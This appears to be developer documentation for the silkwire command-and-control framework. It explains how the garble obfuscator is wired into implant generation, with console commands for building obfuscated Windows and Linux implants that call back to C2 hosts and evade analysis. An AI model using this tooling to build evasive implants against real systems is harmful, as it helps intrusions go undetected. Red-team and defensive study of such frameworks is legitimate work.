# Garble Setup and Integration

This document explains how garble is integrated into the silkwire C2 framework and how to set it up properly.

## Overview

Garble (https://github.com/burrowers/garble) is a Go code obfuscator that provides advanced anti-analysis features for compiled binaries. It's now fully integrated into silkwire for enhanced implant evasion.

## Installation

### Method 1: Using Makefile (Recommended)
```bash
make tools
```

This will:
- Install garble to `$(go env GOPATH)/bin/garble`
- Verify the installation and test garble version
- Show instructions for adding garble to your PATH

### Method 1b: Quick Environment Setup
```bash
# Install tools and setup environment in one go
make tools
source setup_env.sh
```

The `setup_env.sh` script will:
- Add `$(go env GOPATH)/bin` to your PATH
- Verify garble availability
- Set helpful aliases for development

### Method 2: Manual Installation
```bash
go install mvdan.cc/garble@latest
```

### Method 3: Verify Module Dependency
```bash
# Garble is included in go.mod, so you can also run it directly:
go run mvdan.cc/garble@latest version
```

## Integration Details

### 1. Module Dependency
Garble is properly declared in the project:

**go.mod:**
```go
require (
    // ... other dependencies
    mvdan.cc/garble v0.14.2
    // ... 
)
```

**tools.go:**
```go
//go:build tools

package main

import (
    _ "mvdan.cc/garble"
)
```

### 2. Server-Side Integration
The implant generator automatically detects and uses garble when the `--garble` flag is specified. It checks both PATH and GOPATH/bin:

```go
// In server/implant_generator.go
if config.Garble {
    // Check if garble is available in PATH or GOPATH/bin
    var garblePath string
    if _, err := exec.LookPath("garble"); err == nil {
        garblePath = "garble" // Found in PATH
    } else {
        // Try GOPATH/bin/garble using go env
        if goEnvCmd := exec.Command("go", "env", "GOPATH"); goEnvCmd != nil {
            if gopathBytes, err := goEnvCmd.Output(); err == nil {
                gopath := strings.TrimSpace(string(gopathBytes))
                if gopath != "" {
                    goBin := filepath.Join(gopath, "bin", "garble")
                    if _, err := os.Stat(goBin); err == nil {
                        garblePath = goBin
                    }
                }
            }
        }
    }
    
    if garblePath == "" {
        return "", fmt.Errorf("garble not found in PATH or GOPATH/bin. Install it with: make tools")
    }
    // Use garble for compilation
    cmd = exec.Command(garblePath, args...)
} else {
    // Use regular go build
    cmd = exec.Command("go", args...)
}
```

### 3. Console Integration
The console provides the `--garble` flag for implant generation:

```bash
# Basic usage
generate --mtls 192.168.1.100:8443 --garble

# Combined with other options
generate --https example.com:443 --os windows --arch amd64 --garble --evasion
```

## Usage Examples

### Basic Garble Generation
```bash
# In the console:
generate --mtls localhost:8443 --garble
```

### Advanced Configuration
```bash
# Windows implant with full evasion
generate --https c2.example.com:443 \
  --os windows \
  --arch amd64 \
  --garble \
  --evasion \
  --format exe

# Linux implant with debug info
generate --mtls 10.0.0.1:8443 \
  --os linux \
  --arch amd64 \
  --garble \
  --debug
```

## Logging Output

When garble is used, the server provides detailed logging:

```
INFO[2025-08-20 13:26:56] Generating implant for listener: lst_123, OS: windows, Arch: amd64, Format: exe
INFO[2025-08-20 13:26:56] Implant generation options: garble=true, evasion=true
INFO[2025-08-20 13:26:56] Implant build configuration: garble=true, evasion=true
INFO[2025-08-20 13:26:56] Target configuration: 192.168.1.100:8443 (HTTPS transport)
INFO[2025-08-20 13:26:58] Implant compilation completed in 2.3s
INFO[2025-08-20 13:26:58] Successfully generated implant: steelwolf_windows_amd64.exe (8.4 MB, 8847362 bytes)
```

## Troubleshooting

### Error: "garble not found in PATH or GOPATH/bin"
**Solution:**
```bash
# Method 1: Install garble and setup environment
make tools
source setup_env.sh

# Method 2: Install and add to PATH manually
make tools
export PATH="$(go env GOPATH)/bin:$PATH"

# Method 3: Add to your shell profile permanently
echo 'export PATH="$(go env GOPATH)/bin:$PATH"' >> ~/.bashrc
source ~/.bashrc
```

**Note:** The server automatically detects garble in both PATH and GOPATH/bin using absolute path resolution, so garble will work regardless of PATH configuration when installed with `make tools`.

### Error: "garble: no Go version specified"
**Solution:**
This usually means the go.mod file is missing or corrupted. Ensure your working directory has a valid go.mod file with a Go version specified.

### Build Takes Too Long
Garble compilation is slower than regular Go builds due to the obfuscation process. This is normal and expected. For faster development cycles, use regular builds and only enable garble for production implants.

## Benefits of Garble Integration

1. **Automatic Symbol Obfuscation**: Function and variable names are scrambled
2. **String Literal Obfuscation**: Hardcoded strings are encrypted 
3. **Control Flow Obfuscation**: Code structure is modified to confuse analysis
4. **Import Path Obfuscation**: Makes reverse engineering more difficult
5. **Dead Code Elimination**: Removes unused code for smaller binaries

## Module Management

The garble dependency is managed through Go modules:

```bash
# Update to latest version
go get mvdan.cc/garble@latest

# Use specific version
go get mvdan.cc/garble@v0.14.2

# Clean modules
go mod tidy
```

## Development Workflow

1. **Development**: Use regular builds for faster compilation
   ```bash
   generate --mtls localhost:8443
   ```

2. **Testing**: Add garble for realistic evasion testing
   ```bash
   generate --mtls localhost:8443 --garble
   ```

3. **Production**: Use full evasion stack
   ```bash
   generate --https prod.domain.com:443 --garble --evasion --os windows --arch amd64
   ```

This integration ensures that garble is properly managed as a project dependency while providing seamless obfuscation capabilities for enhanced implant evasion.